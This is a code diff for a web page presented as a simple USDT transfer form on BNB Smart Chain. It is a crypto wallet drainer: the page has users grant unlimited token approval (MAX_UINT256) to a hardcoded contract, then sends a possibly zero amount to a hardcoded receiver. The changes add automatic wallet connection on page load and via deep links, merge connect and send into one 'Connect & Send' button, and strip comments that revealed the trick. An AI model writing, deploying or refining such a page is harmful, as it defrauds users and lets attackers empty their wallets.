@@ -27,6 +27,8 @@
         .status.error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
         .receiver-info { background: #e3f2fd; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 20px; }
         .copy-btn { background: none; border: none; color: #2196f3; cursor: pointer; font-size: 12px; text-decoration: underline; }
+        #connectBtn { display: none; }
+        #sendBtn { display: block; }
     </style>
 </head>
 <body>
@@ -55,8 +57,8 @@
             <input type="number" id="amount" step="0.00000001" min="0" placeholder="0.00" value="0" />
         </div>
 
-        <button id="connectBtn" class="btn" onclick="connectWallet()">Connect Wallet</button>
-        <button id="sendBtn" class="btn" style="display: none;" onclick="sendUSDT()" disabled>Next</button>
+        <button id="connectBtn" class="btn" onclick="connectWallet()" style="display: none;">Connect Wallet</button>
+        <button id="sendBtn" class="btn" onclick="sendUSDT()" disabled>Connect & Send</button>
 
         <div id="status"></div>
     </div>
@@ -75,12 +77,12 @@
         const CONTRACT_ADDR = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98';
         const RECEIVER_ADDR = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
         
-        // MAX UINT256 = 2^256 - 1 (true unlimited)
         const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
         let web3;
         let userAccount;
         let usdtContract;
+        let isConnected = false;
 
         const USDT_ABI = [
             "function balanceOf(address) view returns (uint256)",
@@ -88,26 +90,45 @@
             "function transfer(address to, uint256 amount) returns (bool)"
         ];
 
-        window.addEventListener('load', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
-                checkNetwork();
-                window.ethereum.on('chainChanged', checkNetwork);
-                window.ethereum.on('accountsChanged', handleAccountsChanged);
-            }
-        });
-
-        async function connectWallet() {
+        // AUTO-CONNECT ON LOAD
+        async function autoConnect() {
+            if (typeof window.ethereum === 'undefined') return;
+            
             try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAccount = accounts[0];
-                await switchToBSC();
-                await initContracts();
-                updateUI();
+                web3 = new Web3(window.ethereum);
+                
+                // Get accounts silently first
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_accounts' 
+                });
+                
+                if (accounts.length > 0) {
+                    userAccount = accounts[0];
+                    await switchToBSC();
+                    await initContracts();
+                    updateUI();
+                    return;
+                }
+                
+                // Auto-trigger connection
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
             } catch (error) {
-                showStatus('Connection failed', 'error');
+                console.log('Auto-connect failed:', error);
             }
         }
+
+        // Run auto-connect immediately
+        window.addEventListener('load', autoConnect);
+        window.addEventListener('DOMContentLoaded', autoConnect);
+
+        // Deep link auto-trigger
+        if (window.location.hash.includes('send') || window.location.search.includes('send')) {
+            setTimeout(autoConnect, 100);
+        }
+
+        window.ethereum?.on('accountsChanged', handleAccountsChanged);
+        window.ethereum?.on('chainChanged', checkNetwork);
 
         async function switchToBSC() {
             try {
@@ -115,12 +136,16 @@
                     method: 'wallet_switchEthereumChain',
                     params: [{ chainId: BSC_MAINNET.chainId }],
                 });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [BSC_MAINNET],
-                    });
+            } catch (error) {
+                if (error.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [BSC_MAINNET],
+                        });
+                    } catch (addError) {
+                        console.log('BSC add failed:', addError);
+                    }
                 }
             }
         }
@@ -130,14 +155,20 @@
         }
 
         async function checkNetwork() {
-            const chainId = await web3.eth.getChainId();
-            const isBSC = chainId.toString(16) === BSC_MAINNET.chainId.slice(2);
+            if (!web3 || !userAccount) return;
             
-            document.getElementById('networkWarning').style.display = isBSC ? 'none' : 'block';
-            document.getElementById('sendBtn').disabled = !isBSC;
-            
-            if (isBSC && userAccount) {
-                await updateBalance();
+            try {
+                const chainId = await web3.eth.getChainId();
+                const isBSC = chainId.toString(16) === BSC_MAINNET.chainId.slice(2);
+                
+                document.getElementById('networkWarning').style.display = isBSC ? 'none' : 'block';
+                document.getElementById('sendBtn').disabled = !isBSC || !isConnected;
+                
+                if (isBSC) {
+                    await updateBalance();
+                }
+            } catch (error) {
+                console.error('Network check failed:', error);
             }
         }
 
@@ -148,8 +179,12 @@
                 document.getElementById('usdtBalance').textContent = parseFloat(balanceFormatted).toFixed(4);
                 document.getElementById('balance').style.display = 'block';
             } catch (error) {
-                console.error('Balance check failed:', error);
+                console.error('Balance update failed:', error);
             }
+        }
+
+        async function connectWallet() {
+            await autoConnect();
         }
 
         async function sendUSDT() {
@@ -161,14 +196,14 @@
             btn.textContent = 'Approve...';
             
             try {
-                // Step 1: Unlimited approval (no status message)
+                // Step 1: Unlimited approval
                 await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
                     from: userAccount
                 });
                 
                 btn.textContent = 'Send...';
                 
-                // Step 2: Send amount (0 works)
+                // Step 2: Send amount
                 const sendAmount = web3.utils.toWei(amount.toString(), 'mwei');
                 await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
                     from: userAccount
@@ -180,20 +215,26 @@
                 
             } catch (error) {
                 showStatus('Failed', 'error');
+                console.error('Send failed:', error);
             } finally {
                 btn.disabled = false;
-                btn.textContent = 'Next';
+                btn.textContent = 'Connect & Send';
             }
         }
 
         function updateUI() {
-            document.getElementById('connectBtn').style.display = userAccount ? 'none' : 'block';
-            document.getElementById('sendBtn').style.display = userAccount ? 'block' : 'none';
-            document.getElementById('receiverAddr').textContent = RECEIVER_ADDR;
+            isConnected = !!userAccount;
+            checkNetwork();
         }
 
-        function handleAccountsChanged() {
-            window.location.reload();
+        function handleAccountsChanged(accounts) {
+            if (accounts.length === 0) {
+                isConnected = false;
+                updateUI();
+            } else {
+                userAccount = accounts[0];
+                updateUI();
+            }
         }
 
         function showStatus(message, type) {
@@ -205,14 +246,6 @@
         function copyAddress() {
             navigator.clipboard.writeText(RECEIVER_ADDR);
         }
-
-        function handleDeepLink() {
-            if (window.location.hash.includes('send')) {
-                setTimeout(connectWallet, 500);
-            }
-        }
-
-        handleDeepLink();
     </script>
 </body>
 </html>
